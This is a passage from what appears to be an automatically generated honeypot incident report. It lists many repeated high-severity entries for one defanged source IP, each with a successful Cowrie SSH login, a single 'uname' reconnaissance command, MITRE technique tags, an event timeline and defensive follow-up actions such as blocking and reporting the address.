- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bcf6a47a2a2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:02` | `cowrie.session.connect` |
| `2026-08-08 06:59:02` | `cowrie.client.version` |
| `2026-08-08 06:59:02` | `cowrie.client.kex` |
| `2026-08-08 06:59:02` | `cowrie.login.success` |
| `2026-08-08 06:59:03` | `cowrie.session.params` |
| `2026-08-08 06:59:03` | `cowrie.command.input` |
| `2026-08-08 06:59:03` | `cowrie.log.closed` |
| `2026-08-08 06:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86b346e7a47d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:06` | `cowrie.session.connect` |
| `2026-08-08 06:59:06` | `cowrie.client.version` |
| `2026-08-08 06:59:06` | `cowrie.client.kex` |
| `2026-08-08 06:59:06` | `cowrie.login.success` |
| `2026-08-08 06:59:07` | `cowrie.session.params` |
| `2026-08-08 06:59:07` | `cowrie.command.input` |
| `2026-08-08 06:59:07` | `cowrie.log.closed` |
| `2026-08-08 06:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8a80195733

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:10` | `cowrie.session.connect` |
| `2026-08-08 06:59:10` | `cowrie.client.version` |
| `2026-08-08 06:59:10` | `cowrie.client.kex` |
| `2026-08-08 06:59:10` | `cowrie.login.success` |
| `2026-08-08 06:59:11` | `cowrie.session.params` |
| `2026-08-08 06:59:11` | `cowrie.command.input` |
| `2026-08-08 06:59:11` | `cowrie.log.closed` |
| `2026-08-08 06:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce0f92af502

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:14` | `cowrie.session.connect` |
| `2026-08-08 06:59:14` | `cowrie.client.version` |
| `2026-08-08 06:59:14` | `cowrie.client.kex` |
| `2026-08-08 06:59:14` | `cowrie.login.success` |
| `2026-08-08 06:59:15` | `cowrie.session.params` |
| `2026-08-08 06:59:15` | `cowrie.command.input` |
| `2026-08-08 06:59:15` | `cowrie.log.closed` |
| `2026-08-08 06:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ae8dffc2dbf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:18` | `cowrie.session.connect` |
| `2026-08-08 06:59:18` | `cowrie.client.version` |
| `2026-08-08 06:59:18` | `cowrie.client.kex` |
| `2026-08-08 06:59:18` | `cowrie.login.success` |
| `2026-08-08 06:59:19` | `cowrie.session.params` |
| `2026-08-08 06:59:19` | `cowrie.command.input` |
| `2026-08-08 06:59:19` | `cowrie.log.closed` |
| `2026-08-08 06:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e355042f9c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:22` | `cowrie.session.connect` |
| `2026-08-08 06:59:22` | `cowrie.client.version` |
| `2026-08-08 06:59:22` | `cowrie.client.kex` |
| `2026-08-08 06:59:22` | `cowrie.login.success` |
| `2026-08-08 06:59:23` | `cowrie.session.params` |
| `2026-08-08 06:59:23` | `cowrie.command.input` |
| `2026-08-08 06:59:23` | `cowrie.log.closed` |
| `2026-08-08 06:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a7bb586293

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:26` | `cowrie.session.connect` |
| `2026-08-08 06:59:26` | `cowrie.client.version` |
| `2026-08-08 06:59:26` | `cowrie.client.kex` |
| `2026-08-08 06:59:26` | `cowrie.login.success` |
| `2026-08-08 06:59:27` | `cowrie.session.params` |
| `2026-08-08 06:59:27` | `cowrie.command.input` |
| `2026-08-08 06:59:27` | `cowrie.log.closed` |
| `2026-08-08 06:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d30924681fc5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:30` | `cowrie.session.connect` |
| `2026-08-08 06:59:30` | `cowrie.client.version` |
| `2026-08-08 06:59:30` | `cowrie.client.kex` |
| `2026-08-08 06:59:30` | `cowrie.login.success` |
| `2026-08-08 06:59:31` | `cowrie.session.params` |
| `2026-08-08 06:59:31` | `cowrie.command.input` |
| `2026-08-08 06:59:31` | `cowrie.log.closed` |
| `2026-08-08 06:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf6a6fe5f19

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:34` | `cowrie.session.connect` |
| `2026-08-08 06:59:34` | `cowrie.client.version` |
| `2026-08-08 06:59:34` | `cowrie.client.kex` |
| `2026-08-08 06:59:34` | `cowrie.login.success` |
| `2026-08-08 06:59:35` | `cowrie.session.params` |
| `2026-08-08 06:59:35` | `cowrie.command.input` |
| `2026-08-08 06:59:35` | `cowrie.log.closed` |
| `2026-08-08 06:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1102ecad6a8a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:38` | `cowrie.session.connect` |
| `2026-08-08 06:59:38` | `cowrie.client.version` |
| `2026-08-08 06:59:38` | `cowrie.client.kex` |
| `2026-08-08 06:59:39` | `cowrie.login.success` |
| `2026-08-08 06:59:39` | `cowrie.session.params` |
| `2026-08-08 06:59:39` | `cowrie.command.input` |
| `2026-08-08 06:59:40` | `cowrie.log.closed` |
| `2026-08-08 06:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b93f340d0eeb

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:42` | `cowrie.session.connect` |
| `2026-08-08 06:59:42` | `cowrie.client.version` |
| `2026-08-08 06:59:42` | `cowrie.client.kex` |
| `2026-08-08 06:59:43` | `cowrie.login.success` |
| `2026-08-08 06:59:44` | `cowrie.session.params` |
| `2026-08-08 06:59:44` | `cowrie.command.input` |
| `2026-08-08 06:59:44` | `cowrie.log.closed` |
| `2026-08-08 06:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e61efd1a3516

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:46` | `cowrie.session.connect` |
| `2026-08-08 06:59:46` | `cowrie.client.version` |
| `2026-08-08 06:59:46` | `cowrie.client.kex` |
| `2026-08-08 06:59:47` | `cowrie.login.success` |
| `2026-08-08 06:59:48` | `cowrie.session.params` |
| `2026-08-08 06:59:48` | `cowrie.command.input` |
| `2026-08-08 06:59:48` | `cowrie.log.closed` |
| `2026-08-08 06:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bca6e82607b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:50` | `cowrie.session.connect` |
| `2026-08-08 06:59:50` | `cowrie.client.version` |
| `2026-08-08 06:59:50` | `cowrie.client.kex` |
| `2026-08-08 06:59:51` | `cowrie.login.success` |
| `2026-08-08 06:59:51` | `cowrie.session.params` |
| `2026-08-08 06:59:51` | `cowrie.command.input` |
| `2026-08-08 06:59:52` | `cowrie.log.closed` |
| `2026-08-08 06:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23bcad3a897

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:54` | `cowrie.session.connect` |
| `2026-08-08 06:59:54` | `cowrie.client.version` |
| `2026-08-08 06:59:54` | `cowrie.client.kex` |
| `2026-08-08 06:59:55` | `cowrie.login.success` |
| `2026-08-08 06:59:56` | `cowrie.session.params` |
| `2026-08-08 06:59:56` | `cowrie.command.input` |
| `2026-08-08 06:59:56` | `cowrie.log.closed` |
| `2026-08-08 06:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2415a111be7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:59 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:59:59` | `cowrie.session.connect` |
| `2026-08-08 06:59:59` | `cowrie.client.version` |
| `2026-08-08 06:59:59` | `cowrie.client.kex` |
| `2026-08-08 06:59:59` | `cowrie.login.success` |
| `2026-08-08 07:00:00` | `cowrie.session.params` |
| `2026-08-08 07:00:00` | `cowrie.command.input` |
| `2026-08-08 07:00:00` | `cowrie.log.closed` |
| `2026-08-08 07:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e840f38b3ad9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:03` | `cowrie.session.connect` |
| `2026-08-08 07:00:03` | `cowrie.client.version` |
| `2026-08-08 07:00:03` | `cowrie.client.kex` |
| `2026-08-08 07:00:03` | `cowrie.login.success` |
| `2026-08-08 07:00:04` | `cowrie.session.params` |
| `2026-08-08 07:00:04` | `cowrie.command.input` |
| `2026-08-08 07:00:04` | `cowrie.log.closed` |
| `2026-08-08 07:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0446fb7865d0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:07` | `cowrie.session.connect` |
| `2026-08-08 07:00:07` | `cowrie.client.version` |
| `2026-08-08 07:00:07` | `cowrie.client.kex` |
| `2026-08-08 07:00:07` | `cowrie.login.success` |
| `2026-08-08 07:00:08` | `cowrie.session.params` |
| `2026-08-08 07:00:08` | `cowrie.command.input` |
| `2026-08-08 07:00:08` | `cowrie.log.closed` |
| `2026-08-08 07:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c54514a4404

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:10` | `cowrie.session.connect` |
| `2026-08-08 07:00:10` | `cowrie.client.version` |
| `2026-08-08 07:00:11` | `cowrie.client.kex` |
| `2026-08-08 07:00:11` | `cowrie.login.success` |
| `2026-08-08 07:00:12` | `cowrie.session.params` |
| `2026-08-08 07:00:12` | `cowrie.command.input` |
| `2026-08-08 07:00:12` | `cowrie.log.closed` |
| `2026-08-08 07:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b817bcce22a6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:15` | `cowrie.session.connect` |
| `2026-08-08 07:00:15` | `cowrie.client.version` |
| `2026-08-08 07:00:15` | `cowrie.client.kex` |
| `2026-08-08 07:00:15` | `cowrie.login.success` |
| `2026-08-08 07:00:16` | `cowrie.session.params` |
| `2026-08-08 07:00:16` | `cowrie.command.input` |
| `2026-08-08 07:00:16` | `cowrie.log.closed` |
| `2026-08-08 07:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b00916d16ee

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:18` | `cowrie.session.connect` |
| `2026-08-08 07:00:19` | `cowrie.client.version` |
| `2026-08-08 07:00:19` | `cowrie.client.kex` |
| `2026-08-08 07:00:19` | `cowrie.login.success` |
| `2026-08-08 07:00:20` | `cowrie.session.params` |
| `2026-08-08 07:00:20` | `cowrie.command.input` |
| `2026-08-08 07:00:20` | `cowrie.log.closed` |
| `2026-08-08 07:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80e7c21a51aa

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:23` | `cowrie.session.connect` |
| `2026-08-08 07:00:23` | `cowrie.client.version` |
| `2026-08-08 07:00:23` | `cowrie.client.kex` |
| `2026-08-08 07:00:23` | `cowrie.login.success` |
| `2026-08-08 07:00:24` | `cowrie.session.params` |
| `2026-08-08 07:00:24` | `cowrie.command.input` |
| `2026-08-08 07:00:24` | `cowrie.log.closed` |
| `2026-08-08 07:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903a8f529a82

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:27` | `cowrie.session.connect` |
| `2026-08-08 07:00:27` | `cowrie.client.version` |
| `2026-08-08 07:00:27` | `cowrie.client.kex` |
| `2026-08-08 07:00:27` | `cowrie.login.success` |
| `2026-08-08 07:00:28` | `cowrie.session.params` |
| `2026-08-08 07:00:28` | `cowrie.command.input` |
| `2026-08-08 07:00:29` | `cowrie.log.closed` |
| `2026-08-08 07:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-484258d8d68e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:31` | `cowrie.session.connect` |
| `2026-08-08 07:00:31` | `cowrie.client.version` |
| `2026-08-08 07:00:31` | `cowrie.client.kex` |
| `2026-08-08 07:00:32` | `cowrie.login.success` |
| `2026-08-08 07:00:32` | `cowrie.session.params` |
| `2026-08-08 07:00:32` | `cowrie.command.input` |
| `2026-08-08 07:00:32` | `cowrie.log.closed` |
| `2026-08-08 07:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c65ec24ff17

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:35` | `cowrie.session.connect` |
| `2026-08-08 07:00:35` | `cowrie.client.version` |
| `2026-08-08 07:00:35` | `cowrie.client.kex` |
| `2026-08-08 07:00:36` | `cowrie.login.success` |
| `2026-08-08 07:00:37` | `cowrie.session.params` |
| `2026-08-08 07:00:37` | `cowrie.command.input` |
| `2026-08-08 07:00:37` | `cowrie.log.closed` |
| `2026-08-08 07:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92fa8cd85906

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:39` | `cowrie.session.connect` |
| `2026-08-08 07:00:39` | `cowrie.client.version` |
| `2026-08-08 07:00:39` | `cowrie.client.kex` |
| `2026-08-08 07:00:40` | `cowrie.login.success` |
| `2026-08-08 07:00:41` | `cowrie.session.params` |
| `2026-08-08 07:00:41` | `cowrie.command.input` |
| `2026-08-08 07:00:41` | `cowrie.log.closed` |
| `2026-08-08 07:00:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de6dca32fe36

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 07:00 |
| **Last Seen** | 2026-08-08 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 07:00:43` | `cowrie.session.connect` |
